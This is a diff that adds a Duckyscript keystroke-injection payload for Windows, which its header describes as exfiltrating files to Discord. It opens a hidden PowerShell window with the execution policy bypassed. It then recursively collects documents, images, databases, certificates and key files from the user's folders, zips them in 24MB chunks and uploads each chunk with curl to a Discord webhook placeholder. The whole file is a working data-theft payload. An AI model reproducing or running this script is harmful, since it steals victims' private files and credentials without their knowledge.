@@ -1,0 +1,16 @@
+REM Title: beigeworm's Exfiltrate files to Discord.
+REM Author: @beigeworm
+REM Description: Using a Discord webhook to receive all matching files in bulk zips of 25mb each. (searches user folders for pictures, video, text files etc..)
+REM Target: Windows 10 and 11
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 4000
+STRING $hookurl = "WEBHOOK_HERE";Function Exfiltrate {$maxZipFileSize = 24MB;$currentZipSize = 0;$index = 1;$zipFilePath ="$env:temp/Loot$index.zip";$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos");$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft");Add-Type -AssemblyName System.IO.Compression.FileSystem;$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create');foreach ($folder in $foldersToSearch) {foreach ($extension in $fileExtensions) {$files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse;foreach ($file in $files) {$fileSize = $file.Length;if($currentZipSize + $fileSize -gt $maxZipFileSize){$zipArchive.Dispose();$currentZipSize = 0;curl.exe -F file1=@"$zipFilePath" $hookurl;Remove-Item -Path $zipFilePath -Force;Sleep 1;$index++;$zipFilePath ="$env:temp/Loot$index.zip";$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')}$entryName = $file.FullName.Substring($folder.Length + 1);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName);$currentZipSize += $fileSize}}}$zipArchive.Dispose();curl.exe -F file1=@"$zipFilePath" $hookurl;Remove-Item -Path $zipFilePath -Force;Write-Output "$env:COMPUTERNAME : Exfiltration Complete."}Exfiltrate;sleep 5;exit
+DELAY 500
+ENTER
